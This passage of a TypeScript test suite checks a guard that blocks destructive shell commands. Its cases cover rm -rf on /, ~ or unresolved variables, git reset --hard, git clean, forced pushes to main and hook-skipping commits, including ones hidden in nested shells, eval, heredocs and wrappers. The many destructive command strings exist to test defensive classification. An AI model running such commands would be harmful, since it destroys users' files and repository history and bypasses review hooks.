  });

  test("a sibling of the working directory is judged as the path it names when the directory is known", () => {
    expect(classOf("rm -rf $PWD/../other", SESSION)).toBe("removal");
    expect(classOf("rm -rf $PWD/../../x", SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf $PWD/../other", NO_CWD)).toBe("removal");
  });

  test("a variable that only starts with PWD, or another substitution in the target, is still unknown", () => {
    expect(classOf("rm -rf $PWDX/build", SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf $pwd/build", SESSION)).toBe("catastrophic");
    expect(classOf('rm -rf "$(pwd)$(echo /x)"', SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf $(echo $PWD)/build", SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf `echo ~`/build", SESSION)).toBe("catastrophic");
  });

  test("a single-quoted mention of the working directory in a command is not a removal", () => {
    none("echo 'rm -rf $PWD'");
    none('echo "rm -rf $PWD"');
    none("echo \"$(pwd)\" 'rm -rf $(pwd)'");
  });
});

describe("the command prefix scan stays linear", () => {
  const fastest = (command: string, ctx?: Context): number => {
    classify(command, ctx);
    const times = [0, 1, 2, 3, 4].map(() => {
      const start = performance.now();
      classify(command, ctx);
      return performance.now() - start;
    });
    return Math.min(...times);
  };

  // A ratio measured in the same run holds on any runner: four times the input takes about four
  // times as long when the scan is linear and sixteen times as long when it is quadratic. The
  // unmeasured first call keeps a cold JIT from inflating whichever input runs first.
  test.each([
    ["spaces", (count: number) => "A=b ".repeat(count) + "rm -rf build"],
    ["tabs", (count: number) => "A=b\t".repeat(count) + "rm -rf build"],
    ["newlines", (count: number) => "A=b\n".repeat(count) + "rm -rf build"],
    ["quoted values", (count: number) => 'A="b c" '.repeat(count) + "rm -rf build"],
    ["substitutions", (count: number) => "A=$(x) ".repeat(count) + "rm -rf build"],
    ["parentheses", (count: number) => "A=(b=c ".repeat(count) + "rm -rf build"],
    ["before git", (count: number) => "A=b ".repeat(count) + "git status"],
    ["a run of white space", (count: number) => `;${" ".repeat(count * 8)}git status`],
  ])("a command behind assignments (%s): four times the input takes under ten times as long", (_, command) => {
    expect(fastest(command(8_000)) / fastest(command(2_000))).toBeLessThan(10);
  }, 60_000);

  test("the assignments are still skipped, on one line or on several", () => {
    runs(`${"A=b ".repeat(500)}rm -rf build`);
    runs(`${"A=b\n".repeat(500)}rm -rf build`);
    check(`${"A=b ".repeat(500)}git reset --hard`, "git reset --hard");
    catastrophic(`${"A=b ".repeat(500)}sudo rm -rf ~`);
    catastrophic("FOO=1\nrm -rf /");
    catastrophic("sudo A=b rm -rf /");
    catastrophic("A=$(rm -rf ~) true");
    catastrophic('A="$(echo hi)" rm -rf ~');
    none(`${"A=b ".repeat(500)}echo rm -rf build`);
  });
});

describe("a backslash escape", () => {
  test("a continued command reads as one line", () => {
    runs("rm -rf \\\n  ./build \\\n  ./dist");
    runs("rm -rf \\\n  build");
    catastrophic("rm -rf \\\n/");
    catastrophic("rm -rf \\\n  ~/");
  });

  test("an escaped quote does not close a double-quoted span", () => {
    none('echo "see \\"a; rm -rf /\\" docs"');
    none('git commit -m "guard: block \\"cd /; rm -rf ~\\" too"');
    none('git commit -m "note: \\"foo && git reset --hard\\" is bad"');
    catastrophic('echo "a"; rm -rf /');
    catastrophic('echo "a \\" b"; rm -rf /');
  });

  test("an escaped separator or parenthesis is an argument, not a command position", () => {
    none("echo \\; rm -rf /");
    none("echo x \\; rm -rf /");
    none("echo \\( rm -rf / \\)");
    none("echo \\| git reset --hard");
    catastrophic("echo \\\\; rm -rf /");
    catastrophic("echo \\; ; rm -rf /");
  });

  test("an escaped space stays one argument", () => {
    runs("rm -rf my\\ build");
    runs("rm -rf ./x\\ y");
  });

  test("the scan keeps the length of the command", () => {
    for (const command of ["rm -rf \\\n./a", "echo \\; rm", 'echo "\\"; rm"', "x \\\\; y"]) {
      expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
    }
    expect(neutralizeQuotedPositions("echo \\; rm")).toBe("echo \\_ rm");
    expect(neutralizeQuotedPositions("rm \\\n-rf")).toBe("rm   -rf");
  });

  test("shellWords reads a backslash-newline as nothing", () => {
    expect(shellWords("-rf \\\n  ./a \\\n  ./b")).toEqual(["-rf", "./a", "./b"]);
    expect(shellWords("a\\\nb")).toEqual(["ab"]);
  });
});

describe("the command position", () => {
  test.each([
    "{ rm -rf /; }",
    "x; { sudo -E rm -rf ~; }",
    "if true; then rm -rf /; fi",
    "if true\nthen\n  rm -rf /\nfi",
    "for d in a; do rm -rf /; done",
    "if false; then :; else rm -rf /; fi",
    "if false; then :; elif true; then rm -rf /; fi",
    "while rm -rf /; do :; done",
    "until rm -rf /; do :; done",
    "! rm -rf /",
    "sudo -E rm -rf /",
    "sudo -n rm -rf /",
    "sudo -u root rm -rf /",
    "sudo -u root -E rm -rf /",
    "sudo --preserve-env rm -rf /",
    "sudo -- rm -rf /",
    "env -i rm -rf /",
    "env -u X rm -rf /",
    "exec rm -rf /",
    "time rm -rf /",
    "nohup rm -rf /",
    "nice rm -rf /",
  ])("a catastrophic removal behind %j is caught", (command) => {
    catastrophic(command);
  });

  test("a git operation behind a keyword or brace group is caught", () => {
    check("if true; then git reset --hard; fi", "git reset --hard");
    none("{ git stash; }");
    check("sudo -E git clean -fd", "git clean");
  });

  test.each([
    "echo rm -rf then",
    "echo time rm -rf /",
    "echo then rm -rf /",
    "echo { rm -rf / }",
    "echo {rm -rf /}",
    'git commit -m "fix { rm -rf / } handling"',
    "echo '{ rm -rf / }'",
    "echo ! rm -rf /",
    "docker rm -rf /",
    "echo sudo -E rm -rf /",
  ])("a mention of a removal in %j is not one", (command) => {
    none(command);
  });
});

describe("the recursive flag group stays linear", () => {
  const fastest = (command: string): number =>
    Math.min(
      ...[0, 1, 2].map(() => {
        const at = performance.now();
        classify(command);
        return performance.now() - at;
      }),
    );

  // 100k letters take the linear scan a few milliseconds and a quadratic one several seconds on this
  // laptop, so a bound of a second holds on any runner and still fails the quadratic scan.
  test("a long run of one flag letter classifies in under a second", () => {
    expect(fastest(`rm -${"r".repeat(100_000)};`)).toBeLessThan(1_000);
  }, 60_000);

  // A repeated flag or keyword costs about 2 µs a repetition, which a slow runner triples, so the
  // bound is a ratio measured in the same run: four times the input takes about four times as long
  // when the scan is linear and sixteen times as long when it is quadratic. The two sizes run in
  // turn and the least of five ratios counts, so load from the spec files running beside this one
  // that lands on one size's run does not pass for growth.
  const growth = (command: (count: number) => string, small: number): number => {
    const [few, many] = [command(small), command(small * 4)];
    const once = (text: string) => {
      const at = performance.now();
      classify(text);
      return performance.now() - at;
    };
    return Math.min(...Array.from({ length: 5 }, () => once(many) / once(few)));
  };

  test.each([
    ["sudo flags", (count: number) => `sudo ${"-E ".repeat(count)}ls`],
    ["leading keywords", (count: number) => `; ${"then ".repeat(count)}ls`],
  ])("%s: four times the input takes under ten times as long", (_, command) => {
    expect(growth(command, 20_000)).toBeLessThan(10);
  }, 60_000);

  test.each([
    ["deep eval", (count: number) => `${"eval ".repeat(count)}ls`],
    ["a long -c script", (count: number) => `bash -c '${"ls; ".repeat(count)}'`],
    ["sibling shells", (count: number) => "bash -c 'ls'; ".repeat(count)],
    ["shells nested in substitutions", (count: number) => `${'bash -c "$('.repeat(count)}ls${')"'.repeat(count)}`],
    ["heredocs read by shells", (count: number) => "bash <<EOF\nls\nEOF\n".repeat(count)],
    ["a wrapper chain", (count: number) => `${"timeout 5 nice -n 1 ".repeat(count)}ls`],
    ["wrapper options", (count: number) => `xargs ${"-0 ".repeat(count)}ls`],
    ["commits nested in substitutions", (count: number) => `${'git commit -m "$('.repeat(count)}x${')"'.repeat(count)}`],
  ])("nesting, %s: four times the input takes under ten times as long", (_, command) => {
    expect(growth(command, 5_000)).toBeLessThan(10);
  }, 60_000);

  test("a flag group that holds r is still recursive, in any position and case", () => {
    catastrophic("rm -r /");
    catastrophic("rm -fr /");
    catastrophic("rm -rf /");
    catastrophic("rm -Rf /");
    catastrophic("rm -vrf /");
    catastrophic("rm --recursive /");
    catastrophic("rm -f -r /");
    none("rm -f /");
    none("rm -v /");
  });
});

describe("an unquoted heredoc body", () => {
  test("is text, so a script or note it writes is not run", () => {
    none("cat > clean.sh <<EOF\n#!/bin/sh\nrm -rf /tmp/*\nEOF");
    none('cat > clean.sh <<EOF\nrm -rf "$BUILD_DIR"/*\nEOF');
    none("cat > notes.md <<EOF\nrun git reset --hard first; then rm -rf ~\nEOF");
    none("cat <<-EOF\n\trm -rf /\n\tEOF");
    none("cat <<EOF\nrm -rf /");
    none("cat <<EOF\n\\$(rm -rf ~)\nEOF");
  });

  test("still runs a substitution it holds", () => {
    catastrophic("cat <<EOF\n$(rm -rf ~)\nEOF");
    catastrophic("cat <<EOF\n`rm -rf ~`\nEOF");
    catastrophic("cat <<EOF\nx $(echo; rm -rf ~) y\nEOF");
    catastrophic("cat <<EOF\n$(\nrm -rf ~\n)\nEOF");
    none("cat <<EOF\n$(git stash)\nEOF");
  });

  test("is text again after a closed substitution", () => {
    none("cat <<EOF\n$(echo hi) then rm -rf /\nEOF");
    none("cat <<EOF\n`echo hi`; rm -rf /\nEOF");
  });

  test("ends at its terminator, after which a command runs", () => {
    catastrophic("cat <<EOF\nnotes\nEOF\nrm -rf /");
    catastrophic("rm -rf / <<EOF\nnotes\nEOF");
    catastrophic("cat <<-EOF\n\tnotes\n\tEOF\nrm -rf /");
  });

  test("keeps the length of the command", () => {
    const command = "cat <<EOF\nrm -rf /; x $(y; z) w\nEOF\nls";
    expect(neutralizeQuotedPositions(command)).toBe("cat <<EOF\n____________$(y; z)__\nEOF\nls");
  });
});

describe("git operations that read or only name a path", () => {
  test("only a stash drop or clear deletes stashed work", () => {
    none("git stash list");
    none("git stash show -p");
    none("git stash show");
    none("git stash");
    none("git stash pop");
    none("git stash push -m drop");
    none("git stash\ndrop");
    check("git stash drop", "git stash drop");
    check("git stash clear", "git stash clear");
  });

  test("a clean dry run is not a clean", () => {
    none("git clean -n");
    none("git clean -fdn");
    none("git clean -fd --dry-run");
    none("git clean --dry-run -fd");
    check("git clean -fd", "git clean");
    check("git clean -fdx", "git clean");
    check("git clean -fd\nls -n", "git clean");
    check("git clean -fd; ls -n", "git clean");
  });

  test("a checkout of the whole tree is checked, and a checkout of a name runs", () => {
    check("git checkout .", "git checkout .");
    check("git checkout HEAD .", "git checkout .");
    check("git checkout main -- .", "git checkout .");
    check("git checkout -- ./", "git checkout .");
    check("git checkout -- :/", "git checkout .");
    check("git checkout -- '*'", "git checkout .");
    check("git checkout -- ..", "git checkout .");
    none("git checkout ./src");
    none("git checkout -- src lib");
    none("git checkout main");
    none("git checkout .github");
    none("git checkout -b x");
    none("git checkout main\ncp -r build .");
  });

  test("a git rm runs, since git refuses to drop uncommitted changes itself", () => {
    none("git rm -r --cached x");
    none("git rm --cached -r x");
    none("git rm -f -r x");
    none("git rm --cached x");
    none("git rm x");
  });

  test("a restore of the whole worktree is checked, and a restore of the index alone or of named paths runs", () => {
    check("git restore .", "git restore .");
    check("git restore --worktree .", "git restore .");
    check("git restore --staged --worktree -- .", "git restore .");
    none("git restore --staged .");
    none("git restore -S .");
    none("git restore src/a.ts");
    none("git restore --worktree src/a.ts");
  });
});

const forced = (command: string, ctx?: Context) => expect(classify(command, ctx)).toEqual({ kind: "git", reason: FORCE_PUSH_REASON, checks: [], isForcePush: true });
const pushes = (command: string, ctx?: Context) => expect(classify(command, ctx)).toEqual({ kind: "git", checks: [], isForcePush: true });

describe("a force push to the default branch", () => {
  const ON_MAIN = bashIn({ branch: "main" });
  const ON_DEV = bashIn({ branch: "dev" });
  const DEVELOP = bashIn({ branch: "develop", defaultBranch: "develop" });

  test.each([
    "git push --force origin main",
    "git push -f origin main",
    "git push origin main -f",
    "git push -uf origin main",
    "git push --force-with-lease origin main",
    "git push --force-with-lease=main:abc123 origin main",
    "git push --force-if-includes origin main",
    "git push origin +main",
    "git push origin +HEAD:main",
    "git push origin +HEAD:refs/heads/main",
    "git push -f origin HEAD:master",
    "git push origin topic +main",
    "git push --mirror",
    "git push --all -f origin",
    "git -C /repo push -f origin main",
    "sudo git push -f origin main",
  ])("%s is denied", (command) => forced(command));

  test.each([
    "git push -f",
    "git push --force origin",
    "git push -f origin HEAD",
    "git push --force-with-lease",
  ])("%s on the default branch is denied, and on another or an unknown branch runs", (command) => {
    forced(command, ON_MAIN);
    pushes(command, ON_DEV);
    pushes(command);
  });

  test("a force push to another branch, or a + refspec only to another branch, runs", () => {
    pushes("git push -f origin dev");
    pushes("git push origin +topic main");
    pushes("git push -f origin main:refs/heads/mainline");
    pushes("git push -f origin HEAD", ON_DEV);
  });

  test("origin/HEAD names the default branch, and then main and master are ordinary branches", () => {
    forced("git push -f origin develop", DEVELOP);
    forced("git push -f", DEVELOP);
    pushes("git push -f origin main", DEVELOP);
    pushes("git push -f origin master", DEVELOP);
  });

  test("a push that does not force, or a mention of a force push, is not a match", () => {
    none("git push origin main");
    none("git push --all origin");
    none("git push -u origin main");
    none('git commit -m "never git push -f origin main"');
    none("echo 'git push --force origin main'");
  });

  test("the deny reason names the force push, ahead of a whole-tree operation beside it", () => {
    expect(reasonOf("git push -f origin main")).toBe(FORCE_PUSH_REASON);
    expect(classify("git push -f origin main && git reset --hard")).toEqual({
      kind: "git",
      reason: FORCE_PUSH_REASON,
      checks: [{ operation: "git reset --hard", query: "tracked", at: [{ dir: "" }] }],
      isForcePush: true,
    });
    expect(reasonOf("git push -f origin dev; git commit -n -m x")).toBe(NO_VERIFY_REASON);
  });
});

describe("a commit that skips its hooks", () => {
  test.each([
    "git commit --no-verify -m x",
    "git commit -m x --no-verify",
    "git commit --no-veri -m x",
    "git commit -n -m x",
    "git commit -nm x",
    "git commit -anm x",
    "git commit --amend --no-edit -n",
    'git commit -m "$(cat <<\'EOF\'\nmessage\nEOF\n)" --no-verify',
    "git -C /repo commit --no-verify",
    "FOO=1 git commit -n",
  ])("%s is denied", (command) => expect(reasonOf(command)).toBe(NO_VERIFY_REASON));

  test.each([
    "git commit -m x",
    "git commit -mn",
    "git commit -m -n",
    "git commit --message -n",
    'git commit -m "skip -n and --no-verify"',
    "git commit -n --verify -m x",
    "git commit -- -n",
    "git push --no-verify",
    "echo git commit --no-verify",
    "git commit -m 'git commit --no-verify'",
  ])("%s is not a hook-skipping commit", (command) => none(command));

  test("the deny reason names the skipped hooks", () => {
    expect(classify("git commit --no-verify -m x")).toEqual({ kind: "git", reason: NO_VERIFY_REASON, checks: [], isForcePush: false });
  });
});

describe("a nested command", () => {
  test.each([
    'bash -c "rm -rf /"',
    "sh -c 'rm -rf ~'",
    'sh -c \'rm -rf "$HOME"\'',
    "bash -lc 'rm -rf /'",
    "bash -e -c 'rm -rf /'",
    "bash --norc -c 'rm -rf /'",
    "bash -o pipefail -c 'rm -rf /'",
    "zsh -c 'rm -rf ~'",
    "dash -c 'rm -rf ~'",
    "ksh -c 'rm -rf ~'",
    "/bin/sh -c 'rm -rf ~'",
    'sudo bash -c "rm -rf /"',
    'sudo -u root sh -c "cd /tmp && rm -rf ~"',
    'env bash -c "rm -rf /"',
    'eval "rm -rf /"',
    "eval rm -rf /",
    'echo ok && eval "cd /x; rm -rf ~"',
    'bash -c "echo \\"hi\\"; rm -rf /"',
    "bash -c \"bash -c 'rm -rf /'\"",
    'echo "$(bash -c \'rm -rf ~\')"',
    "bash <<EOF\nrm -rf /\nEOF",
    "bash <<'EOF'\nrm -rf /\nEOF",
    "sudo bash <<-EOF\n\trm -rf ~\n\tEOF",
    "bash -s <<EOF\nrm -rf ~\nEOF",
    "bash -s -- arg <<EOF\nrm -rf ~\nEOF",
    "bash <<< 'rm -rf /'",
    "bash -c 'eval \"rm -rf /\"'",
    "pwsh -c 'Remove-Item -Recurse C:\\'",
    "eval eval eval eval rm -rf /",
  ])("%s is catastrophic", (command) => catastrophic(command));

  test.each([
    ['env bash -c "git reset --hard"', "git reset --hard"],
    ["bash -c 'git stash drop'", "git stash drop"],
    ["bash <<EOF\ngit clean -fdx\nEOF", "git clean"],
    ["eval 'git checkout -- .'", "git checkout ."],
  ] as const)("%s is checked against the repository", (command, operation) => check(command, operation));

  test("a commit that skips its hooks inside a shell is denied", () => expect(reasonOf("bash -c 'git commit --no-verify -m x'")).toBe(NO_VERIFY_REASON));

  test("a force push to the default branch inside a shell is denied", () => {
    forced("bash -c 'git push -f origin main'");
    pushes("sh -c 'git push -f origin dev'");
  });

  test("a removal of a deeper path inside a shell runs", () => {
    runs("bash -c 'rm -rf build'");
    runs("eval rm -rf 'my build'");
    runs("bash <<EOF\nrm -rf dist\nEOF");
  });

  test.each([
    "echo \"bash -c 'rm -rf /'\"",
    "git commit -m \"run bash -c 'rm -rf /' never\"",
    "bash -c 'echo rm -rf /'",
    "bash script.sh",
    "bash script.sh 'rm -rf /'",
    "bash script.sh <<EOF\nrm -rf /\nEOF",
    "bash -c 'ls' <<EOF\nrm -rf /\nEOF",
    "cat <<'EOF'\nbash -c 'rm -rf /'\nEOF",
    "cat <<EOF\nrm -rf /\nEOF",
    "echo eval rm -rf /",
    "grep -rn 'eval \"rm -rf /\"' .",
    "bash -c \"$CMD\"",
    "eval \"$CMD\"",
  ])("%s runs nothing destructive", (command) => none(command));

  test("a finding a substitution shows to both levels is reported once", () => {
    check('bash -c "$(git stash drop)"', "git stash drop");
    check("bash <<EOF\n$(git stash drop)\nEOF", "git stash drop");
    runs("rm -rf a; bash -c 'rm -rf b'; rm -rf c");
  });
});

describe("a wrapper that runs the command it is given", () => {
  test.each([
    "timeout 5 rm -rf ~",
    "timeout 5s rm -rf ~",
    "timeout -s KILL 5 rm -rf ~",
    "timeout --signal=KILL -k 2 1.5m rm -rf ~",
    "timeout --foreground 5 rm -rf /",
    "nice -n 10 rm -rf /",
    "nice -10 rm -rf /",
    "nohup rm -rf /",
    "stdbuf -oL rm -rf /",
    "stdbuf -o L -e0 rm -rf /",
    "ionice -c3 rm -rf /",
    "ionice -c 2 -n 7 rm -rf /",
    "chrt -f 10 rm -rf /",
    "chrt --idle 0 rm -rf /",
    "setsid -f rm -rf /",
    "time rm -rf /",
    "time -p rm -rf /",
    "xargs rm -rf /",
    "xargs -0 -n 1 rm -rf ~",
    "sudo timeout 5 nice -n 5 rm -rf /",
    "FOO=1 timeout 5 rm -rf ~",
  ])("%s is catastrophic", (command) => catastrophic(command));

  test("a git operation behind a wrapper is checked", () => {
    check("timeout 30 git reset --hard", "git reset --hard");
    check("nice -n 5 git clean -fdx", "git clean");
    none("sudo timeout 5 nice -n 5 git stash");
  });

  test("xargs feeds rm targets nobody can see, so it runs", () => {
    runs("xargs rm -rf");
    runs("find . -name '*.o' | xargs -0 rm -rf");
    runs("find . -name build | xargs -I {} rm -rf {}");
  });

  test.each([
    "echo timeout 5 rm -rf ~",
    "timeout 5 ls rm -rf ~",
    "nice ls rm -rf /",
    "xargs echo rm -rf /",
  ])("%s runs nothing destructive", (command) => none(command));
});

const SESSION = bashIn({ home: "/home/user", cwd: "/home/user/proj", root: "/home/user/proj" });
const MAYBE = " It is assigned only where the assignment may not run (after && or ||, in a pipeline, or in a block or loop), so it can still be unset.";
const variableReason = (variable: string, target: string, empty: string, cause = "") => {
  const name = variable.replace(/^\$\{?|\}$/g, "");
  return `Destructive rm -rf blocked: the target starts with a variable that can be unset or empty when the rm runs: ${variable}.${cause} Then ${target} is ${empty}. Assign ${name} in a statement of its own that always runs before the rm (${name}=/path/to/dir; cd dir && rm -rf "$${name}/..."), or write \${${name}:?} so the shell stops when ${name} is unset or empty.`;
};
const CD_FAILED = (target: string) =>
  `Destructive rm -rf blocked: the rm can run after its cd failed: a cd joined to it by ; or a newline leaves the rm in the original directory when the cd fails, and there ${target} is protected. Join them with && (cd dir && rm -rf ...) so the rm runs only after the cd succeeds.`;
const CD_UNKNOWN = (target: string) =>
  `Destructive rm -rf blocked: the rm follows a cd into a directory the guard cannot resolve, so it judges ${target} in the working directory, where it is protected. cd into a literal path or a variable assigned in the same command, or name the full path in the rm.`;
const SUBSTITUTION =
  "Destructive rm -rf blocked: a target holds a command substitution the guard cannot evaluate, so it can name any path. Run the substitution on its own first, then remove the path it prints by name.";
const denied = (command: string, reason: string) => expect(classify(command, SESSION)).toEqual({ kind: "catastrophic", reason });

describe("a variable the command assigns", () => {
  test.each([
    "S=/home/user/.cache/tmp/x/scratchpad; rm -rf $S/root",
    'S=/home/user/.cache/tmp/x/scratchpad && rm -rf "$S/smoke"',
    "export S=/home/user/.cache/tmp/x; rm -rf $S/x",
    'S="/home/user/my dir/x"; rm -rf "$S/y"',
    "S='/home/user/.cache/x'; rm -rf \"$S\"/pkg.a \"$S\"/cfg.b",
    "S=/home/user/.cache; S=$S/tmp/x; rm -rf $S",
    "S=/srv/a B=/srv/b/c; rm -rf $S/x $B",
    "S=~/.cache/tmp; rm -rf $S/x",
    'SP="$HOME/.cache/tmp/x"; rm -rf "$SP/fresh-clone"',
    "D=/home/user/.cache/x; for d in a b; do rm -rf $D/$d; done",
    "S=/home/user/.cache/x; (cd sub && rm -rf $S/y)",
    "S=/home/user/.cache/x; echo $(rm -rf $S/y)",
    "for n in 1 2; do S=/srv/run$n; rm -rf $S/clips; done",
    "if true; then S=/srv/x; rm -rf $S/y; fi",
  ])("%s runs", (command) => runs(command, SESSION));

  test.each([
    ["S=; rm -rf $S/x", RM_CATASTROPHIC_REASON],
    ["S=/; rm -rf $S/x", RM_CATASTROPHIC_REASON],
    ['S=/; rm -rf "$S/home/user/dev"', RM_CATASTROPHIC_REASON],
    ['S=/; rm -rf "$S"/home/user/dev', RM_CATASTROPHIC_REASON],
    ["S=/home/user; rm -rf $S/*", RM_CATASTROPHIC_REASON],
    ["S=$UNSET; rm -rf $S/x", variableReason("$UNSET", "$UNSET/x", "/x")],
    ["S=$(foo); rm -rf $S/x", variableReason("$S", "$S/x", "/x")],
    ["S=/tmp/x rm -rf $S/y", variableReason("$S", "$S/y", "/y")],
    ["rm -rf $UNSET/usr", variableReason("$UNSET", "$UNSET/usr", "/usr")],
    ['rm -rf "${DIR}/"*', variableReason("${DIR}", "${DIR}/*", "/*")],
  ])("%s is denied, naming the cause", (command, reason) => denied(command, reason));

  test.each([
    "false && S=/srv/a; rm -rf $S/x",
    "false || S=/srv/a; rm -rf $S/x",
    "false && S=/srv/a || rm -rf $S/x",
    "S=/srv/a | true; rm -rf $S/x",
    "S=/srv/a; echo | read S; rm -rf $S/x",
    "if c; then S=/srv/a; fi; rm -rf $S/x",
    "S=/srv/a; if c; then S=; fi; rm -rf $S/x",
    "if c; then S=/srv/a; else rm -rf $S/x; fi",
    "S=/srv/a; for d in a b; do rm -rf $S/x; S=; done",
    "S=/srv/a; . ./env.sh; rm -rf $S/x",
    "f() { S=/srv/a; }; rm -rf $S/x",
    "f() { S=; }; S=/srv/a; f; rm -rf $S/x",
    "f() {\n  S=/srv/a\n}\nrm -rf $S/x",
    "cd /srv/x && S=/srv/x; rm -rf $S/x",
  ])("an assignment that may not run before the rm leaves the variable unknown, and the reason says so: %s", (command) =>
    denied(command, variableReason("$S", "$S/x", "/x", MAYBE)),
  );

  test.each([
    "S=/srv/a & rm -rf $S/x",
    "(S=/srv/a); rm -rf $S/x",
    "echo $(S=/srv/a); rm -rf $S/x",
    "S=/srv/a; while read S; do rm -rf $S/x; done",
    "S=/srv/a; unset S; rm -rf $S/x",
    "S=/srv/a; read S; rm -rf $S/x",
    "S=/srv/a; IFS= read -r S < f; rm -rf $S/x",
    "S=/srv/a; LC_ALL=C unset S; rm -rf $S/x",
    'S="/srv/my dir"; rm -rf $S/x',
  ])("a variable the command does not leave with a known value is unknown: %s", (command) => denied(command, variableReason("$S", "$S/x", "/x")));

  test("a quoted reference keeps a value with a blank as one word", () => runs('S="/srv/my dir"; rm -rf "$S/x"', SESSION));
});

describe("a ${VAR:?} target", () => {
  test.each(['rm -rf "${S:?}/x"', "rm -rf ${S:?S is unset}/x", 'rm -rf "${BUILD_DIR:?}"/*'])("%s runs, since the shell stops when S is unset or empty", (command) =>
    runs(command, SESSION),
  );

  test("still reads as home when the variable is HOME, and as a root when it climbs", () => {
    denied('rm -rf "${HOME:?}"', RM_CATASTROPHIC_REASON);
    denied("rm -rf ${S:?}/../..", RM_CATASTROPHIC_REASON);
  });
});

describe("a $(mktemp) substitution", () => {
  test.each([
    'rm -rf "$(mktemp -d)"',
    "rm -rf $(mktemp -d -t omca.XXXXXX)/sub",
    "T=$(mktemp -d); rm -rf $T",
    'T="$(mktemp -d /tmp/omca.XXXXXX)"; rm -rf "$T"/x',
    "T=$(mktemp -d) && trap 'rm -rf \"$T\"' EXIT && rm -rf $T/stuck",
  ])("%s runs", (command) => runs(command, SESSION));

  test("a climb out of it is judged as the path it reaches, and any other substitution stays unknown", () => {
    denied("T=$(mktemp -d); rm -rf $T/..", RM_CATASTROPHIC_REASON);
    denied("rm -rf $(mktemp -d; echo /)", SUBSTITUTION);
    denied("rm -rf $(foo)/x", SUBSTITUTION);
    denied('rm -rf "$(state_dir)"', SUBSTITUTION);
    denied("rm -rf `mktemp -d`", SUBSTITUTION);
  });
});

describe("a cd before the removal", () => {
  test.each([
    "cd /srv/x && rm -rf *",
    "cd /srv/x && rm -rf .",
    "cd /srv/x && rm -rf ./*",
    "S=/srv/x; cd $S && rm -rf *",
    'S=/srv/x; cd "$S/sub" && rm -rf .',
    "cd /srv/x && cd sub && rm -rf *",
    "(cd /srv/x && rm -rf *)",
    "cd /srv/x && rm -rf $PWD/*",
    "cd build && rm -rf *",
  ])("joined by &&, %s is judged in the directory the cd enters", (command) => runs(command, SESSION));

  test.each([
    ["cd /srv/x; rm -rf *", CD_FAILED("*")],
    ["cd /srv/x\nrm -rf *", CD_FAILED("*")],
    ["cd /srv/x; rm -rf .", CD_FAILED(".")],
    ["cd /srv/x || true; rm -rf ./*", CD_FAILED("./*")],
    ["cd /tmp && rm -rf *", RM_CATASTROPHIC_REASON],
    ["cd / && rm -rf usr", RM_CATASTROPHIC_REASON],
    ["cd && rm -rf *", RM_CATASTROPHIC_REASON],
    ["(cd /srv/x); rm -rf *", RM_CATASTROPHIC_REASON],
    ["cd $UNSET && rm -rf *", CD_UNKNOWN("*")],
    ['cd "$(git rev-parse --show-toplevel)" && rm -rf .', CD_UNKNOWN(".")],
    ["cd - && rm -rf *", CD_UNKNOWN("*")],
  ])("%s is denied, naming the cause", (command, reason) => denied(command, reason));

  test("a cd does not move a target that does not depend on the directory", () => {
    runs("cd / && rm -rf /srv/x/build", SESSION);
    denied("cd /srv/x && rm -rf ~", RM_CATASTROPHIC_REASON);
  });
});

describe("a redirection", () => {
  test.each([
    "rm -rf -- < $S/file",
    "rm -rf build 2>/dev/null",
    "rm -rf build 2> /dev/null",
    "rm -rf build > /tmp/log 2>&1",
    "rm -rf build &>/dev/null",
    "rm -rf build <<< x",
  ])("%s is not a target", (command) => runs(command, SESSION));
});

test("--no-preserve-root names the option", () =>
  denied("rm -rf --no-preserve-root /srv/a/b", "Destructive rm -rf blocked: --no-preserve-root lets rm remove the filesystem root. Drop the option and name the path to remove."));

describe("the repository a git command runs in", () => {
  const at = (command: string, ctx?: Context) => {
    const finding = classify(command, ctx);
    return finding?.kind === "git" ? finding.checks.map((check) => check.at) : finding;
  };

  test("is the session directory, moved by -C and by a cd the command makes", () => {
    expect(at("git reset --hard")).toEqual([[{ dir: "" }]]);
    expect(at("git -C ../other reset --hard")).toEqual([[{ dir: "../other" }]]);
    expect(at("git -C /srv -C repo stash drop")).toEqual([[{ dir: "/srv/repo" }]]);
    expect(at("R=/srv/repo; git -C \"$R\" checkout .")).toEqual([[{ dir: "/srv/repo" }]]);
    expect(at("git -C ~/repo reset --hard", SESSION)).toEqual([[{ dir: "/home/user/repo" }]]);
    expect(at("cd /srv/repo && git clean -fd")).toEqual([[{ dir: "/srv/repo" }]]);
    expect(at("cd /srv && git -C repo restore .")).toEqual([[{ dir: "/srv/repo" }]]);
    expect(at("cd /srv/repo; git reset --hard")).toEqual([[{ dir: "/srv/repo" }, { dir: "" }]]);
    expect(at("cd /srv/repo && bash -c 'git reset --hard'")).toEqual([[{ dir: "/srv/repo" }]]);
  });

  test("carries --git-dir and --work-tree, never a -c override", () => {
    expect(at("git --git-dir=/r/.git --work-tree /w reset --hard")).toEqual([[{ dir: "", gitDir: "/r/.git", workTree: "/w" }]]);
    expect(at("git -c core.fsmonitor=evil -C /srv/repo reset --hard")).toEqual([[{ dir: "/srv/repo" }]]);
  });

  test("is unknown when -C or the cd names a directory the guard cannot resolve", () => {
    expect(at("git -C $UNSET reset --hard")).toEqual([[{ dir: undefined }]]);
    expect(at("git -C ~/repo reset --hard")).toEqual([[{ dir: undefined }]]);
    expect(at("cd $UNSET && git reset --hard")).toEqual([[{ dir: undefined }]]);
  });
});

describe("a git clean dry run", () => {
  const cleanOf = (command: string) => {
    const finding = classify(command);
    return finding?.kind === "git" ? finding.checks[0]?.clean : finding;
  };

  test("keeps the options that widen what it deletes and the literal pathspecs", () => {
    expect(cleanOf("git clean -fdx")).toEqual(["-d", "-x", "-f"]);
    expect(cleanOf("git clean -ffd -e keep -- build dist")).toEqual(["-d", "-f", "-f", "--", "build", "dist"]);
    expect(cleanOf("git clean --force -X --exclude=keep")).toEqual(["-X", "-f"]);
    expect(cleanOf("git clean -fd build")).toEqual(["-d", "-f", "--", "build"]);
  });

  test("drops pathspecs the shell expands first, so it lists a superset", () => {
    expect(cleanOf("git clean -fd $S/build")).toEqual(["-d", "-f"]);
    expect(cleanOf("git clean -fd *.o")).toEqual(["-d", "-f"]);
    expect(cleanOf("git clean -fd ~/x")).toEqual(["-d", "-f"]);
  });
});

describe("real commands that removed scratch and build directories", () => {
  test.each([
